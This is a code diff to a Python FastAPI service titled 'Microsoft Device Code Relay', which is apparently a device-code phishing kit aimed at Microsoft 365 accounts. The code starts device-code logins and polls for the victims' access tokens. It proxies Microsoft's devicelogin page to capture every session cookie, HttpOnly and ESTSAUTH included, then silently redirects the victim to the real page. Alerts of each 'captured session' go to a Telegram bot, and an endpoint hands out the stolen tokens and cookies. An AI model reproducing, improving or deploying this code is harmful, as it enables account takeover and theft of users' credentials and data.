@@ -5,9 +5,7 @@ import asyncio
 import os
 import time
 import json
-import re
 from http.cookies import SimpleCookie
-from typing import Dict, Optional
 import redis.asyncio as aioredis
 
 app = FastAPI(title="Microsoft Device Code Relay")
@@ -16,13 +14,12 @@ CLIENT_ID = os.getenv("MICROSOFT_CLIENT_ID")
 TENANT_ID = os.getenv("MICROSOFT_TENANT_ID", "common")
 RELAY_URL = os.getenv("RELAY_URL")
 SCOPES = os.getenv("SCOPES", "https://graph.microsoft.com/.default offline_access openid profile").split()
-ENABLE_PROXY = os.getenv("ENABLE_SESSION_PROXY", "true").lower() == "true"
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT = os.getenv("TELEGRAM_CHAT_ID")
 REDIS_URL = os.getenv("REDIS_URL")
 
 redis_client = None
-sessions: Dict[str, dict] = {}
+sessions = {}
 
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
@@ -33,9 +30,8 @@ async def startup():
         print("ERROR: MICROSOFT_CLIENT_ID is missing")
     if REDIS_URL:
         redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
-        print("Redis connected")
-    print("Backend started")
-
+        print("✅ Redis connected")
+    print("🚀 Backend started")
 
 async def get_session(dc):
     if redis_client:
@@ -43,24 +39,23 @@ async def get_session(dc):
         return json.loads(data) if data else None
     return sessions.get(dc)
 
-
 async def save_session(dc, data, ttl=1200):
     if redis_client:
         await redis_client.set(f"session:{dc}", json.dumps(data), ex=ttl)
     else:
         sessions[dc] = data
 
-
 async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
+        print("Telegram not configured")
         return
     try:
-        msg = f"✅ New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (O365/Outlook included)"
+        msg = f"✅ New Session Captured!\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies Captured: {count} (ESTSAUTH + O365/Outlook included)"
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
-    except:
-        pass
-
+        print(f"📨 Telegram sent – {count} cookies")
+    except Exception as e:
+        print(f"Telegram error: {e}")
 
 async def poll_token(device_code):
     session = await get_session(device_code)
@@ -102,7 +97,6 @@ async def poll_token(device_code):
             except:
                 await asyncio.sleep(interval)
 
-
 @app.post("/start-device-auth")
 async def start_auth():
     if not CLIENT_ID:
@@ -117,10 +111,9 @@ async def start_auth():
             raise HTTPException(400, "Failed to get device code")
         data = r.json()
         dc = data["device_code"]
-        await save_session(dc, {"user_code": data["user_code"], "expires_in": data["expires_in"], "interval": 5, "status": "pending", "token": None, "cookies": {}})
+        await save_session(dc, {"user_code": data["user_code"], "expires_in": data["expires_in"], "status": "pending", "token": None, "cookies": {}})
         asyncio.create_task(poll_token(dc))
         return data
-
 
 @app.get("/auth-status/{device_code}")
 async def get_status(device_code: str):
@@ -129,18 +122,13 @@ async def get_status(device_code: str):
         raise HTTPException(404, "Session not found")
     return {"status": s["status"], "user_code": s["user_code"], "token": s.get("token"), "cookies": s.get("cookies")}
 
-
 @app.get("/health")
 async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
-
-# PROXY - Silent redirect to original Microsoft page + full cookie capture
+# PROXY – Silent redirect + aggressive cookie capture
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
-    if not ENABLE_PROXY:
-        raise HTTPException(403, "Proxy disabled")
-
     session = await get_session(device_code)
     if not session or "user_code" not in session:
         raise HTTPException(404, "Session expired or invalid")
@@ -149,7 +137,6 @@ async def proxy(device_code: str, request: Request):
     for n, c in session.get("cookies", {}).items():
         cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
 
-    # Original Microsoft device login page
     target_url = "https://microsoft.com/devicelogin"
 
     async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
@@ -161,7 +148,7 @@ async def proxy(device_code: str, request: Request):
             content=await request.body() if request.method != "GET" else None
         )
 
-    # Full cookie capture from every redirect
+    # Aggressive capture of ALL Set-Cookie (including HttpOnly)
     captured = {}
     for past in list(resp.history) + [resp]:
         for h in past.headers.getlist("set-cookie"):
@@ -171,28 +158,22 @@ async def proxy(device_code: str, request: Request):
                 for m in cookie.values():
                     captured[m.key] = {
                         "value": m.value,
-                        "domain": m["domain"] or ".microsoftonline.com",
-                        "path": m["path"] or "/",
-                        "expires": m["expires"],
-                        "secure": bool(m["secure"]),
-                        "httponly": bool(m["httponly"])
+                        "domain": m.get("domain") or ".microsoftonline.com",
+                        "path": m.get("path") or "/",
+                        "expires": m.get("expires"),
+                        "secure": bool(m.get("secure")),
+                        "httponly": bool(m.get("httponly"))
                     }
             except:
                 pass
 
-    if "cookies" not in session:
-        session["cookies"] = {}
-    session["cookies"].update(captured)
+    session.setdefault("cookies", {}).update(captured)
     await save_session(device_code, session)
 
-    # Silent redirect to original Microsoft page
+    # Silent redirect to real Microsoft page
     microsoft_url = f"https://microsoft.com/devicelogin?input={session['user_code']}"
-    html = f"""
-    <html><head><meta http-equiv="refresh" content="0;url={microsoft_url}"></head>
-    <body></body></html>
-    """
+    html = f'<html><head><meta http-equiv="refresh" content="0;url={microsoft_url}"></head><body></body></html>'
     return Response(content=html, media_type="text/html")
-
 
 if __name__ == "__main__":
     import uvicorn
